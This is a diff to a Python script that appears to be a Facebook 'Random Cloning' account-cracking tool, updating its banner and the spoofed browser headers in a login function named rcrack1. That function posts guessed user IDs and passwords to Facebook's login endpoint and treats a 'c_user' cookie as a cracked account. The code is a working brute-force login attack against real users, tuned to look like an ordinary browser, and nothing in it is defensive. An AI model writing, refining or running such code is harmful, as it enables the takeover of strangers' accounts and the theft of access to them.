@@ -122,18 +122,16 @@ for txxxtt in range (1000):
 	ugen.append(ffg)
 #--------------------------(LOGO BOX)--------------------------#
 logo =("""
-\x1b[38;5;46m                                   ,...             
-\x1b[38;5;46m      db                         .d' ""       mm    
-     ;MM:                        dM`          MM    
-    ,V^MM.    `7Mb,od8 ,6"Yb.   mMMmm ,6"Yb.mmMMmm  
-   ,M  `MM      MM' "'8)   MM    MM  8)   MM  MM    
-   AbmmmqMA     MM     ,pm9MM    MM   ,pm9MM  MM    
-  A'     VML    MM    8M   MM    MM  8M   MM  MM    
-.AMA.   .AMMA..JMML.  `Moo9^Yo..JMML.`Moo9^Yo.`Mbmo                                                   
+\033[1;92m .d8b.  d8888b.  .d8b.  d88888b  .d8b.  d888888b 
+\033[1;92md8' `8b 88  `8D d8' `8b 88'     d8' `8b `~~88~~' 
+\033[1;92m88ooo88 88oobY' 88ooo88 88ooo   88ooo88    88    
+\033[1;92m88~~~88 88`8b   88~~~88 88~~~   88~~~88    88    
+\033[1;92m88   88 88 `88. 88   88 88      88   88    88    
+\033[1;92mYP   YP 88   YD YP   YP YP      YP   YP    YP                                                   
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mArafat Hosan
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mArafat Hosan
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m2.1
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m2.2
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46mRandom Cloning
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46mfree
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
@@ -223,20 +221,25 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'm.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent':pro}
+           'method': 'GET',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+           'cache-control': 'max-age=0',
+           'dpr': '2.625',
+           'referer': 'https://www.facebook.com/',
+           'sec-ch-prefers-color-scheme': 'dark',
+           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+           'sec-ch-ua-mobile': '?0',
+           'sec-ch-ua-model': '""',
+           'sec-ch-ua-platform': '"Linux"',
+           'sec-ch-ua-platform-version': '""',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': pro}
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
